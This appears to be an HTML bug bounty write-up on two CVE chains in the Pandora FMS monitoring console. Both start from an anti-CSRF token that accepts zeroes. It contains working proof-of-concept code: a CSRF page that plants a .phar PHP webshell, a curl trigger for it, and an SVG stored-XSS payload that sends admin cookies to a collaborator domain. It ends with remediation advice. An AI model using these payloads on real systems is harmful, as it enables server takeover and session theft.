@@ -1,0 +1,608 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>A Wall of Zeroes: One Broken Token, Two Critical CVEs</title>
+<style>
+  :root {
+    --bg:        #0b0e14;
+    --bg-soft:   #11151f;
+    --panel:     #131824;
+    --code-bg:   #0d1117;
+    --border:    #232a38;
+    --text:      #d7dde8;
+    --text-dim:  #8a94a7;
+    --heading:   #e8edf5;
+    --accent:    #00e08a;   /* terminal green */
+    --accent-2:  #4aa8ff;   /* electric blue  */
+    --danger:    #ff5c72;
+    --amber:     #ffb454;
+    --mono: "SFMono-Regular", "JetBrains Mono", "Fira Code", "Cascadia Code", Menlo, Consolas, monospace;
+    --sans: "Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+  }
+
+  * { box-sizing: border-box; }
+
+  html { -webkit-text-size-adjust: 100%; }
+
+  body {
+    margin: 0;
+    background:
+      radial-gradient(1200px 600px at 80% -10%, rgba(0,224,138,0.06), transparent 60%),
+      radial-gradient(900px 500px at -10% 10%, rgba(74,168,255,0.05), transparent 55%),
+      var(--bg);
+    color: var(--text);
+    font-family: var(--sans);
+    font-size: 18px;
+    line-height: 1.75;
+    letter-spacing: 0.1px;
+  }
+
+  .wrap {
+    max-width: 820px;
+    margin: 0 auto;
+    padding: 40px 24px 96px;
+  }
+
+  /* ---- Terminal-style masthead ---- */
+  .masthead {
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    overflow: hidden;
+    background: var(--panel);
+    box-shadow: 0 20px 60px rgba(0,0,0,0.45);
+    margin-bottom: 44px;
+  }
+  .term-bar {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    padding: 12px 16px;
+    background: var(--bg-soft);
+    border-bottom: 1px solid var(--border);
+  }
+  .dot { width: 12px; height: 12px; border-radius: 50%; display: inline-block; }
+  .dot.r { background: #ff5f56; }
+  .dot.y { background: #ffbd2e; }
+  .dot.g { background: #27c93f; }
+  .term-title {
+    margin-left: 10px;
+    font-family: var(--mono);
+    font-size: 13px;
+    color: var(--text-dim);
+  }
+  .masthead-body { padding: 30px 28px 34px; }
+  .kicker {
+    font-family: var(--mono);
+    font-size: 13px;
+    color: var(--accent);
+    letter-spacing: 1px;
+    text-transform: uppercase;
+    margin: 0 0 14px;
+  }
+  h1 {
+    font-size: clamp(1.8rem, 5vw, 2.7rem);
+    line-height: 1.15;
+    margin: 0 0 18px;
+    color: var(--heading);
+    font-weight: 800;
+    letter-spacing: -0.5px;
+  }
+  .subtitle { color: var(--text-dim); font-size: 1.02rem; margin: 0; }
+  .byline {
+    margin: 18px 0 0;
+    font-size: 0.95rem;
+    color: var(--text-dim);
+  }
+  .byline a { color: var(--accent-2); font-weight: 600; }
+  .tags { margin-top: 20px; display: flex; flex-wrap: wrap; gap: 8px; }
+  .tag {
+    font-family: var(--mono);
+    font-size: 12px;
+    padding: 4px 10px;
+    border-radius: 999px;
+    border: 1px solid var(--border);
+    color: var(--text-dim);
+    background: var(--bg-soft);
+  }
+  .tag.crit { color: var(--danger); border-color: rgba(255,92,114,0.4); }
+  .tag.cve  { color: var(--amber); border-color: rgba(255,180,84,0.4); font-family: var(--mono); }
+
+  /* ---- Typography ---- */
+  h2 {
+    font-size: 1.6rem;
+    margin: 3rem 0 1rem;
+    padding-top: 1.4rem;
+    border-top: 1px solid var(--border);
+    color: var(--heading);
+    letter-spacing: -0.3px;
+  }
+  h3 {
+    font-size: 1.22rem;
+    margin: 2.2rem 0 0.8rem;
+    color: var(--accent-2);
+  }
+  h2 .no {
+    font-family: var(--mono);
+    color: var(--accent);
+    font-size: 1rem;
+    margin-right: 10px;
+    opacity: 0.8;
+  }
+  p { margin: 1rem 0; }
+  a { color: var(--accent-2); text-decoration: none; border-bottom: 1px dotted rgba(74,168,255,0.5); }
+  a:hover { border-bottom-style: solid; }
+  strong { color: var(--heading); font-weight: 700; }
+  hr { border: none; border-top: 1px solid var(--border); margin: 2.5rem 0; }
+
+  ul, ol { padding-left: 1.4rem; }
+  li { margin: 0.5rem 0; }
+
+  /* ---- Inline code ---- */
+  code {
+    font-family: var(--mono);
+    font-size: 0.86em;
+    background: rgba(0,224,138,0.08);
+    color: var(--accent);
+    padding: 2px 6px;
+    border-radius: 5px;
+    border: 1px solid rgba(0,224,138,0.15);
+    word-break: break-word;
+  }
+
+  /* ---- Code blocks ---- */
+  .codeblock {
+    position: relative;
+    margin: 1.6rem 0;
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    overflow: hidden;
+    background: var(--code-bg);
+  }
+  .codeblock .cb-head {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 8px 14px;
+    background: #0a0d13;
+    border-bottom: 1px solid var(--border);
+    font-family: var(--mono);
+    font-size: 12px;
+    color: var(--text-dim);
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+  }
+  .codeblock pre {
+    margin: 0;
+    padding: 18px;
+    overflow-x: auto;
+    font-family: var(--mono);
+    font-size: 14px;
+    line-height: 1.6;
+    color: #c9d4e3;
+    -webkit-overflow-scrolling: touch;
+  }
+  .codeblock pre code {
+    background: none;
+    border: none;
+    padding: 0;
+    color: inherit;
+    font-size: inherit;
+  }
+
+  /* naive token coloring */
+  .tok-com { color: #5c6b82; font-style: italic; }
+  .tok-str { color: var(--amber); }
+  .tok-key { color: #ff7b9c; }
+  .tok-fn  { color: var(--accent-2); }
+  .tok-tag { color: var(--accent); }
+  .tok-zero{ color: var(--danger); font-weight: 700; }
+
+  /* ---- Callout / blockquote ---- */
+  blockquote {
+    margin: 1.8rem 0;
+    padding: 16px 20px;
+    background: linear-gradient(90deg, rgba(0,224,138,0.07), transparent);
+    border-left: 3px solid var(--accent);
+    border-radius: 0 8px 8px 0;
+    color: var(--text);
+  }
+  blockquote p { margin: 0.4rem 0; }
+  blockquote strong { color: var(--accent); }
+
+  .note {
+    margin: 1.8rem 0;
+    padding: 16px 20px;
+    background: rgba(74,168,255,0.06);
+    border: 1px solid rgba(74,168,255,0.25);
+    border-radius: 8px;
+    font-size: 0.95rem;
+    color: var(--text-dim);
+  }
+  .note strong { color: var(--accent-2); }
+
+  .lead {
+    font-size: 1.15rem;
+    color: var(--text);
+  }
+
+  footer {
+    margin-top: 4rem;
+    padding-top: 1.4rem;
+    border-top: 1px solid var(--border);
+    color: var(--text-dim);
+    font-family: var(--mono);
+    font-size: 13px;
+    text-align: center;
+  }
+  footer a { color: var(--accent-2); }
+
+  /* Editable tokens get a subtle highlight so they are easy to spot */
+  .tgt, .appname, .apppath, .host, .collab {
+    color: var(--accent);
+    font-family: var(--mono);
+    font-weight: 600;
+  }
+  .cve {
+    color: var(--amber);
+    font-family: var(--mono);
+    font-weight: 600;
+  }
+
+  @media (max-width: 600px) {
+    body { font-size: 16.5px; }
+    .wrap { padding: 24px 16px 72px; }
+    .masthead-body { padding: 22px 18px 26px; }
+    h2 { font-size: 1.4rem; }
+  }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <!-- =========================================================
+       EDIT ONLY THIS BLOCK to fill in the real values.
+       Everything on the page (including inside the code blocks)
+       updates automatically from these variables.
+       ========================================================= -->
+  <script>
+    const TARGET_NAME = "Pandora FMS";          // the affected product
+
+    const APP_NAME = "pandora_console";           // install folder in the URL path
+    const APP_PATH = "pandora_console";           // absolute path to the install on the server
+    const HOST = "127.0.0.1:8081";                   // host:port serving the app, e.g. 10.0.0.5:8081
+    const COLLAB = "attacker.oastify.com";               // your OOB / collaborator domain for the XSS beacon
+
+    const CVE_RCE = "CVE-2026-64947";             // the RCE chain
+    const CVE_XSS = "CVE-2026-64946";             // the stored XSS chain
+
+    const AUTHOR_1 = { name: "Gaurish Kauthankar", url: "https://in.linkedin.com/in/gaurish-kauthankar-a471b316a" };
+    const AUTHOR_2 = { name: "Damodar Naik", url: "https://in.linkedin.com/in/damodar-naik-90a87017a" };
+  </script>
+
+  <header class="masthead">
+    <div class="term-bar">
+      <span class="dot r"></span><span class="dot y"></span><span class="dot g"></span>
+      <span class="term-title">~/writeups/wall-of-zeroes.md</span>
+    </div>
+    <div class="masthead-body">
+      <p class="kicker">// bug bounty write-up</p>
+      <h1>A Wall of Zeroes: How One Broken Token Became Two Critical CVEs</h1>
+      <p class="subtitle">One broken anti-CSRF check, two full exploit chains, and a way of thinking you can borrow for your own hunting.</p>
+      <p class="byline">by <a id="byline-1" href="#">author one</a> and <a id="byline-2" href="#">author two</a></p>
+      <div class="tags">
+        <span class="tag crit">High</span>
+        <span class="tag cve" id="tag-cve-rce"></span>
+        <span class="tag cve" id="tag-cve-xss"></span>
+        <span class="tag">CSRF bypass</span>
+        <span class="tag">RCE</span>
+        <span class="tag">Stored XSS</span>
+      </div>
+    </div>
+  </header>
+  <!-- 
+  <div class="note">
+    <strong>About the placeholders:</strong> the target application is written as
+    <span class="tgt"></span> throughout, and the two issues are tracked as
+    <span class="cve cve-rce"></span> (the RCE chain) and <span class="cve cve-xss"></span> (the stored XSS chain).
+    Reusing this post? Edit the handful of variables at the top of the source file and every mention on the page,
+    including the ones inside the code blocks, updates by itself.
+  </div>
+  -->
+  <h2><span class="no">01</span>The Hook</h2>
+  <p class="lead">Not every good bug is complicated. Some of them are just plain broken in a way that makes you stop and stare at the screen for a second. This is one of those.</p>
+  <p>We were poking at a self-hosted monitoring platform, the kind of thing that sits quietly inside a corporate network with visibility into every server it watches. It had a file upload feature behind an "anti-CSRF" token, so we tried the laziest attack we could think of: we replaced the token with a bunch of zeroes and sent it anyway. The server accepted it.</p>
+  <p>That one weak check was the opening for everything that followed. From it we built two separate exploit chains, both off the exact same root cause:</p>
+  <ol>
+    <li>CSRF bypass, then a <code>.phar</code> upload, ending in <strong>Remote Code Execution</strong> (<span class="cve cve-rce"></span>). Full server takeover.</li>
+    <li>CSRF bypass, then a malicious SVG upload, ending in <strong>Stored XSS and admin session hijack</strong> (<span class="cve cve-xss"></span>). Full account takeover.</li>
+  </ol>
+  <p>One broken token, two ways to own the box. Here's how we found it, and more usefully, how you can find things like it yourself.</p>
+
+  <h2><span class="no">02</span>The Target</h2>
+  <p><span class="tgt"></span> is a monitoring platform. It's a large PHP application that runs on-premises and keeps an eye on an organization's infrastructure: servers, network gear, alerting rules, all of it. Software like this makes a great target for two reasons.</p>
+  <p>First, it's privileged. A monitoring server needs to reach deep into the network to do its job, so if you pop the monitor you usually get a nice pivot point into everything around it.</p>
+  <p>Second, it's old-school. Big, feature-heavy PHP apps tend to grow their own security machinery over the years: hand-rolled CSRF tokens, custom upload filters, blacklists. Custom security code is where the bugs hide, because sooner or later everyone reinvents a wheel that isn't quite round.</p>
+  <p>The feature we ended up living in was the <strong>File Manager</strong> (the Attachments / Plugin tab), which lets an admin upload files to the server. Any time an app lets you write a file to disk, that's worth a close look.</p>
+
+  <h2><span class="no">03</span>The Methodology (The "How")</h2>
+  <p>This is the part actually worth your time, so we'll slow down. Everything after this is just execution.</p>
+
+  <h3>Lesson 1: uploads plus a custom token means go poke at it</h3>
+  <p>When we map out an app, we keep a running list of the features where a small mistake has an outsized payoff. File uploads sit near the top of that list, right up there with auth and anything that renders user input. So the moment we saw a File Manager, we knew where the afternoon was going.</p>
+  <p>We uploaded a plain, boring file and captured the request in Burp. That's the first thing to do with any upload: watch a normal request go through before you try to break anything. You can't cheat the rules until you know what they are.</p>
+  <p>Trimmed down, the request looked like this:</p>
+
+  <div class="codeblock">
+    <div class="cb-head"><span>http, captured upload</span><span>burp</span></div>
+    <pre><code><span class="tok-key">POST</span> /index.php?sec=plugin&amp;op=attach <span class="tok-key">HTTP/1.1</span>
+Host: <span class="host"></span>
+Cookie: <span class="tok-str">PHPSESSID=&lt;admin session&gt;</span>
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+------WebKitFormBoundary
+Content-Disposition: form-data; name=<span class="tok-str">"hash"</span>
+
+a3f9c1e08b7d4f2a9c6e1b0d5f8a2c74
+------WebKitFormBoundary
+Content-Disposition: form-data; name=<span class="tok-str">"hash2"</span>
+
+7d2e5b1a9f0c3e6d8b4a1c7f2e9d0b53
+------WebKitFormBoundary
+Content-Disposition: form-data; name=<span class="tok-str">"file"</span>; filename=<span class="tok-str">"notes.txt"</span>
+Content-Type: text/plain
+
+hello world
+------WebKitFormBoundary--</code></pre>
+  </div>
+
+  <p>Two things stood out right away. The <code>hash</code> and <code>hash2</code> fields were obviously a home-grown anti-CSRF token scheme. And the request was authenticated purely by the <code>PHPSESSID</code> cookie, nothing else.</p>
+  <p>That pairing is a big red flag. Cookie-based auth is exactly what CSRF feeds on, and the only thing standing between us and a forged cross-site request was those two hash values. So the whole thing came down to a single question: does the server actually check them?</p>
+
+  <h3>Lesson 2: a token being present doesn't mean it's being checked</h3>
+  <p>This is the mindset we'd most like you to take away. Developers love to drop a token onto a form and call it CSRF-protected. But a token only protects anything if the server does three things: generates it unpredictably, ties it to your session, and rejects the request when the value is wrong or missing.</p>
+  <p>Plenty of custom implementations get the first two right and completely fumble the third. They write <code>if (isset($hash))</code> where they meant <code>if ($hash === $expected)</code>. They compare against an empty string. They pass on any value that's simply truthy. The token looks legit, but it's a bouncer who checks that you're holding a ticket without ever reading it.</p>
+  <p>So we tested it in the dumbest way available. No leaking the real token, no reversing the algorithm. We just filled both fields with zeroes:</p>
+
+  <div class="codeblock">
+    <div class="cb-head"><span>the ten-second test</span><span>payload</span></div>
+    <pre><code>hash  = <span class="tok-zero">00000000000000000000000000000000</span>
+hash2 = <span class="tok-zero">00000000000000000000000000000000</span></code></pre>
+  </div>
+
+  <p>We sent it, and the upload went through.</p>
+  <p>So the check wasn't really doing anything. The server was happy to accept a static value that any attacker can guess, which means you don't need to know a single thing about the victim's session to forge a request it'll trust. CSRF was fully back in play.</p>
+
+  <blockquote>
+    <p><strong>Worth internalizing:</strong> any time you run into a custom token, try the cheap stuff before anything clever. Remove it, blank it, zero it, reuse yesterday's, drop in another user's. You'll be surprised how often one of those just works.</p>
+  </blockquote>
+
+  <h3>Lesson 3: a CSRF bypass is a capability, not the finish line</h3>
+  <p>A lot of people would stop here, write up "CSRF on file upload," and file a medium. We think that sells it short. A CSRF bypass on an upload endpoint isn't really a vulnerability on its own, it's a capability: it lets us make a logged-in admin's browser write an arbitrary file to the server just by getting them to open a page.</p>
+  <p>Which turns the interesting question into "what file do we write?" And that's where the same root cause split into two very different, very unpleasant chains. This is the other half of the method: once you've got a write primitive, figure out what the upload filter actually blocks, then step around it.</p>
+
+  <h2><span class="no">04</span>The Exploitation (The "Proof")</h2>
+
+  <h3>Chain 1: <code>.phar</code> upload to Remote Code Execution (<span class="cve cve-rce"></span>)</h3>
+  <p>The upload filter blocked <code>.php</code>. Decent instinct from the developers, but it was a blacklist, not an allowlist. A blacklist is a promise to remember every dangerous thing forever, and nobody ever does.</p>
+  <p>PHP will execute more than just <code>.php</code>. Depending on the server config, <code>.phar</code>, <code>.phtml</code>, <code>.php5</code>, <code>.php7</code> and a few others all get interpreted too. The blacklist forgot about <code>.phar</code>. We didn't.</p>
+  <p>So we built a CSRF page that forges the upload with our zeroed token and drops a <code>.phar</code> webshell into the web-accessible plugin directory:</p>
+
+  <div class="codeblock">
+    <div class="cb-head"><span>csrf-rce.html</span><span>html + js</span></div>
+    <pre><code><span class="tok-tag">&lt;html&gt;</span>
+<span class="tok-tag">&lt;body&gt;</span>
+<span class="tok-tag">&lt;script&gt;</span>
+  <span class="tok-com">// webshell code</span>
+  <span class="tok-key">var</span> fileContent = <span class="tok-str">`&lt;?php if(isset($_REQUEST['cmd'])){ echo "&lt;pre&gt;"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "&lt;/pre&gt;"; die;}?&gt;`</span>;
+  <span class="tok-key">var</span> blob = <span class="tok-key">new</span> <span class="tok-fn">Blob</span>([fileContent], { type: <span class="tok-str">"application/octet-stream"</span> });
+  <span class="tok-key">var</span> file = <span class="tok-key">new</span> <span class="tok-fn">File</span>([blob], <span class="tok-str">"webshell.phar"</span>, { type: <span class="tok-str">"application/octet-stream"</span> });
+
+  <span class="tok-key">var</span> formData = <span class="tok-key">new</span> <span class="tok-fn">FormData</span>();
+  formData.<span class="tok-fn">append</span>(<span class="tok-str">"umask"</span>, <span class="tok-str">"509"</span>);
+  formData.<span class="tok-fn">append</span>(<span class="tok-str">"file"</span>, file);
+  formData.<span class="tok-fn">append</span>(<span class="tok-str">"decompress_sent"</span>, <span class="tok-str">"1"</span>);
+  formData.<span class="tok-fn">append</span>(<span class="tok-str">"upload_file_or_zip"</span>, <span class="tok-str">"1"</span>);
+  formData.<span class="tok-fn">append</span>(<span class="tok-str">"go"</span>, <span class="tok-str">"Go"</span>);
+  formData.<span class="tok-fn">append</span>(<span class="tok-str">"real_directory"</span>, <span class="tok-str">"/var/www/html/<span class="apppath"></span>/attachment/plugin"</span>);
+  formData.<span class="tok-fn">append</span>(<span class="tok-str">"directory"</span>, <span class="tok-str">"attachment/plugin"</span>);
+
+  <span class="tok-com">// The anti-CSRF tokens are never actually validated, so we send zeroes.</span>
+  formData.<span class="tok-fn">append</span>(<span class="tok-str">"hash"</span>, <span class="tok-str">"<span class="tok-zero">00000000000000000000000000000000</span>"</span>);
+  formData.<span class="tok-fn">append</span>(<span class="tok-str">"hash2"</span>, <span class="tok-str">"<span class="tok-zero">00000000000000000000000000000000</span>"</span>);
+
+  <span class="tok-fn">fetch</span>(<span class="tok-str">"http://<span class="host"></span>/<span class="appname"></span>/index.php?sec=gservers&amp;sec2=godmode/servers/plugin&amp;filemanager=1&amp;id_plugin=0&amp;tab=Attachments"</span>, {
+    method: <span class="tok-str">"POST"</span>,
+    body: formData,
+    credentials: <span class="tok-str">"include"</span>
+  });
+<span class="tok-tag">&lt;/script&gt;</span>
+<span class="tok-tag">&lt;/body&gt;</span>
+<span class="tok-tag">&lt;/html&gt;</span></code></pre>
+  </div>
+
+  <p>Why it works, piece by piece:</p>
+  <ul>
+    <li><code>credentials: "include"</code> tells the browser to attach the victim's <code>PHPSESSID</code> cookie to a cross-origin request, so the server sees a fully authenticated admin upload.</li>
+    <li>The zeroed <code>hash</code> and <code>hash2</code> sail straight past the broken validation, no session knowledge needed.</li>
+    <li><code>webshell.phar</code> gets by a filter that only knows to be scared of <code>.php</code>.</li>
+    <li>The file lands in a directory the web server is happy to execute rather than just serve.</li>
+  </ul>
+  <p>Now we host the page, get an authenticated admin to click a link (a forum post, a phishing email, a comment on their own dashboard, whatever fits), and their browser quietly plants the shell for us. Then we just visit it:</p>
+
+  <div class="codeblock">
+    <div class="cb-head"><span>trigger the shell</span><span>bash</span></div>
+    <pre><code><span class="tok-fn">curl</span> <span class="tok-str">"http://<span class="host"></span>/<span class="appname"></span>/attachment/plugin/webshell.phar?cmd=id"</span>
+<span class="tok-com"># uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></code></pre>
+  </div>
+
+  <p>Code execution, on a monitoring server. That's the ball game.</p>
+
+  <h3>Chain 2: SVG upload to Stored XSS and session hijack (<span class="cve cve-xss"></span>)</h3>
+  <p>Say PHP execution had actually been locked down in that upload directory. Are we done? Not really, because the same broken token hands us a second path that doesn't need code execution at all.</p>
+  <p>The File Manager accepts SVG uploads. Here's the part people forget: an SVG isn't really an image, it's an XML document that a browser will run JavaScript out of. If the server stores your SVG and later serves it inline, any <code>&lt;script&gt;</code> inside it runs in the application's origin. That's stored XSS, straight out of the textbook.</p>
+  <p>Our SVG payload:</p>
+
+  <div class="codeblock">
+    <div class="cb-head"><span>payload.svg</span><span>xml</span></div>
+    <pre><code><span class="tok-com">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>
+<span class="tok-tag">&lt;svg</span> version=<span class="tok-str">"1.1"</span> baseProfile=<span class="tok-str">"full"</span> xmlns=<span class="tok-str">"http://www.w3.org/2000/svg"</span><span class="tok-tag">&gt;</span>
+   <span class="tok-tag">&lt;polygon</span> id=<span class="tok-str">"triangle"</span> points=<span class="tok-str">"0,0 0,50 50,0"</span> fill=<span class="tok-str">"#009900"</span> stroke=<span class="tok-str">"#004400"</span><span class="tok-tag">/&gt;</span>
+   <span class="tok-tag">&lt;script</span> type=<span class="tok-str">"text/javascript"</span><span class="tok-tag">&gt;</span>
+     <span class="tok-fn">fetch</span>(<span class="tok-str">'https://<span class="collab"></span>/?cookies='</span> + <span class="tok-fn">btoa</span>(document.cookie));
+     <span class="tok-fn">alert</span>(<span class="tok-str">'XSS'</span>);
+   <span class="tok-tag">&lt;/script&gt;</span>
+<span class="tok-tag">&lt;/svg&gt;</span></code></pre>
+  </div>
+
+  <p>We deliver it with the same zeroed-token CSRF idea, this time aimed at the File Manager's setup endpoint. The page writes the SVG into the <code>images</code> directory, then after a few seconds it points the admin's own browser at the stored file so the payload fires:</p>
+
+  <div class="codeblock">
+    <div class="cb-head"><span>csrf-xss.html</span><span>html + js</span></div>
+    <pre><code><span class="tok-tag">&lt;!DOCTYPE html&gt;</span>
+<span class="tok-tag">&lt;html&gt;</span>
+<span class="tok-tag">&lt;head&gt;</span>
+    <span class="tok-tag">&lt;title&gt;</span>CSRF POC<span class="tok-tag">&lt;/title&gt;</span>
+<span class="tok-tag">&lt;/head&gt;</span>
+<span class="tok-tag">&lt;body&gt;</span>
+    <span class="tok-tag">&lt;script&gt;</span>
+    <span class="tok-com">// xss payload</span>
+        <span class="tok-key">const</span> svgContent = <span class="tok-str">`&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg"&gt;
+   &lt;polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/&gt;
+   &lt;script type="text/javascript"&gt;
+     fetch('https://<span class="collab"></span>/?cookies=' + btoa(document.cookie));
+     alert('XSS');
+   &lt;\/script&gt;
+&lt;/svg&gt;`</span>;
+
+        <span class="tok-key">const</span> base = <span class="tok-str">'http://<span class="host"></span>/<span class="appname"></span>'</span>;
+        <span class="tok-key">const</span> uploadedFileUrl = base + <span class="tok-str">'/images/xss-poc.svg'</span>;
+
+        <span class="tok-key">const</span> formData = <span class="tok-key">new</span> <span class="tok-fn">FormData</span>();
+        formData.<span class="tok-fn">append</span>(<span class="tok-str">'directory'</span>, <span class="tok-str">'images'</span>);
+        formData.<span class="tok-fn">append</span>(<span class="tok-str">'real_directory'</span>, <span class="tok-str">'/var/www/html/<span class="apppath"></span>/images'</span>);
+        formData.<span class="tok-fn">append</span>(<span class="tok-str">'hash'</span>, <span class="tok-str">'<span class="tok-zero">00000000000000000000000000000000</span>'</span>);
+        formData.<span class="tok-fn">append</span>(<span class="tok-str">'hash2'</span>, <span class="tok-str">'<span class="tok-zero">00000000000000000000000000000000</span>'</span>);
+        formData.<span class="tok-fn">append</span>(<span class="tok-str">'umask'</span>, <span class="tok-str">''</span>);
+        formData.<span class="tok-fn">append</span>(<span class="tok-str">'upload_file'</span>, <span class="tok-str">'1'</span>);
+        formData.<span class="tok-fn">append</span>(<span class="tok-str">'go'</span>, <span class="tok-str">'Go'</span>);
+        formData.<span class="tok-fn">append</span>(<span class="tok-str">'file'</span>, <span class="tok-key">new</span> <span class="tok-fn">Blob</span>([svgContent], {type: <span class="tok-str">'image/svg+xml'</span>}), <span class="tok-str">'xss-poc.svg'</span>);
+
+        <span class="tok-com">// Fire upload (ignore response/errors)</span>
+        <span class="tok-fn">fetch</span>(base + <span class="tok-str">'/index.php?sec=gsetup&amp;sec2=godmode/setup/file_manager'</span>, {
+            method: <span class="tok-str">'POST'</span>,
+            body: formData,
+            credentials: <span class="tok-str">'include'</span>
+        }).<span class="tok-fn">catch</span>(() =&gt; {});
+
+        <span class="tok-com">// After 5 seconds, load the uploaded file so the stored XSS fires</span>
+        <span class="tok-fn">setTimeout</span>(() =&gt; {
+            window.location.href = uploadedFileUrl;
+        }, <span class="tok-str">5000</span>);
+    <span class="tok-tag">&lt;/script&gt;</span>
+<span class="tok-tag">&lt;/body&gt;</span>
+<span class="tok-tag">&lt;/html&gt;</span></code></pre>
+  </div>
+
+  <p>Why it works:</p>
+  <ul>
+    <li>The upload does no content inspection on the SVG at all. Nothing strips <code>&lt;script&gt;</code>, nothing scrubs <code>onload</code> or <code>onerror</code>, nothing filters <code>javascript:</code>.</li>
+    <li>When the stored SVG gets served inline (its <code>Content-Type</code> renders in the browser instead of downloading), the embedded script runs as though the app itself wrote it.</li>
+    <li>Running in <span class="tgt"></span>'s origin, our script reads <code>document.cookie</code> and beacons the admin's session token back to us.</li>
+  </ul>
+  <p>Drop that stolen <code>PHPSESSID</code> into our own browser and now we're the admin. And because the payload is stored, it fires again for every user who views the file, so the blast radius keeps growing on its own until someone manually deletes it.</p>
+
+  <h2><span class="no">05</span>The Impact</h2>
+  <p>Both chains start from one admin clicking one link. No credentials, no prior access, nothing beyond a single page visit.</p>
+  <p>From Chain 1 (<span class="cve cve-rce"></span>):</p>
+  <ul>
+    <li>Read any file on the server: database credentials, config secrets, private keys.</li>
+    <li>Modify application data, plant persistent backdoors, quietly tamper with monitoring rules to blind the defenders.</li>
+    <li>Destroy data or take the platform offline.</li>
+    <li>Pivot off the monitoring box into the rest of the network it can reach.</li>
+  </ul>
+  <p>From Chain 2 (<span class="cve cve-xss"></span>):</p>
+  <ul>
+    <li>Full impersonation of the admin, inheriting their entire privilege set.</li>
+    <li>Complete control of <span class="tgt"></span>'s configuration, monitored infrastructure data, alert rules, and user management.</li>
+    <li>Persistence, since every later viewer of the SVG gets caught in it too.</li>
+  </ul>
+  <p>For a platform whose whole job is watching the network for trouble, it doesn't get much worse. The watcher ends up being the intruder's own set of eyes.</p>
+
+  <h2><span class="no">06</span>The Fix &amp; Takeaways</h2>
+  <h3>How it should be fixed</h3>
+  <p>The root cause is a single broken check, so fix that first and then harden the sinks around it:</p>
+  <ul>
+    <li><strong>Fix the CSRF check for real.</strong> Generate cryptographically random, session-bound tokens and validate them with a strict, constant-time comparison. Reject static, null-padded, blank, or malformed values instead of waving them through.</li>
+    <li><strong>Allowlist file types instead of blacklisting.</strong> Permit a known-good set of extensions and verify the magic bytes, not just the name. Everything executable (<code>.phar</code>, <code>.phtml</code>, <code>.php5</code>, <code>.php7</code>, and the rest) is blocked simply by not being on the list.</li>
+    <li><strong>Neutralize the upload directory.</strong> Turn off script interpretation there via <code>.htaccess</code> or server config, and serve user files with <code>Content-Disposition: attachment</code>, <code>Content-Type: application/octet-stream</code>, and <code>X-Content-Type-Options: nosniff</code> so nothing renders or runs inline.</li>
+    <li><strong>Sanitize SVGs, or just don't accept them.</strong> Strip <code>&lt;script&gt;</code>, event handlers, <code>&lt;foreignObject&gt;</code>, and <code>javascript:</code> URIs.</li>
+    <li><strong>Harden the cookie.</strong> Set <code>HttpOnly</code> (which kills the <code>document.cookie</code> theft) and <code>SameSite=Strict</code> or <code>Lax</code> (which adds a second, browser-enforced layer against CSRF).</li>
+  </ul>
+  <p>It's worth noticing how many independent layers all had to fail at once for this to work: the token, the extension filter, the execution policy, the content-type handling, the cookie flags. Defense in depth isn't paranoia, it's the difference between a near miss and a headline.</p>
+
+  <h3>Three things to take with you</h3>
+  <ol>
+    <li><strong>Test the token you're being told to trust.</strong> Custom anti-CSRF, anti-replay, and signature checks are very often just present rather than enforced. Before you reach for anything sophisticated, try the cheap attacks: delete it, blank it, zero it, reuse it, swap it. The zeroes that kicked off this whole story took about ten seconds to try.</li>
+    <li><strong>A write primitive is a launchpad, so enumerate the filter.</strong> Once you can put a file on a server, don't stop at "arbitrary file upload." Ask what you can actually write. Blacklists leak (<code>.php</code> becomes <code>.phar</code>), image parsers execute (SVG becomes XSS). The severity lives in the payload you get away with, not in the upload itself.</li>
+    <li><strong>Chain it, then chain it again.</strong> We got two critical findings out of one root cause because we kept asking "what if the next layer holds?" instead of stopping at the first win. Even once RCE looked likely, we still went and found the XSS path. Assume each defense might survive and go find the exploit that gets through anyway. That's what takes a report from good to undeniable.</li>
+  </ol>
+
+  <p>Thanks for reading, and good luck out there.</p>
+
+  <footer>
+    // written up by <a id="footer-1" href="#">author one</a> and <a id="footer-2" href="#">author two</a>
+  </footer>
+
+</div>
+
+<!-- =========================================================
+     Fills the page from the variables at the top. No need to
+     touch anything below unless you want to change behavior.
+     ========================================================= -->
+<script>
+  (function () {
+    document.querySelectorAll(".tgt").forEach(function (el) {
+      el.textContent = TARGET_NAME;
+    });
+    document.querySelectorAll(".appname").forEach(function (el) {
+      el.textContent = APP_NAME;
+    });
+    document.querySelectorAll(".apppath").forEach(function (el) {
+      el.textContent = APP_PATH;
+    });
+    document.querySelectorAll(".host").forEach(function (el) {
+      el.textContent = HOST;
+    });
+    document.querySelectorAll(".collab").forEach(function (el) {
+      el.textContent = COLLAB;
+    });
+    document.querySelectorAll(".cve-rce").forEach(function (el) {
+      el.textContent = CVE_RCE;
+    });
+    document.querySelectorAll(".cve-xss").forEach(function (el) {
+      el.textContent = CVE_XSS;
+    });
+
+    document.getElementById("tag-cve-rce").textContent = CVE_RCE;
+    document.getElementById("tag-cve-xss").textContent = CVE_XSS;
+
+    function wireAuthor(ids, author) {
+      ids.forEach(function (id) {
+        var el = document.getElementById(id);
+        el.textContent = author.name;
+        el.href = author.url;
+        el.target = "_blank";
+        el.rel = "noopener noreferrer";
+      });
+    }
+    wireAuthor(["byline-1", "footer-1"], AUTHOR_1);
+    wireAuthor(["byline-2", "footer-2"], AUTHOR_2);
+
+    document.title = "A Wall of Zeroes: " + TARGET_NAME + " write-up";
+  })();
+</script>
+</body>
+</html>
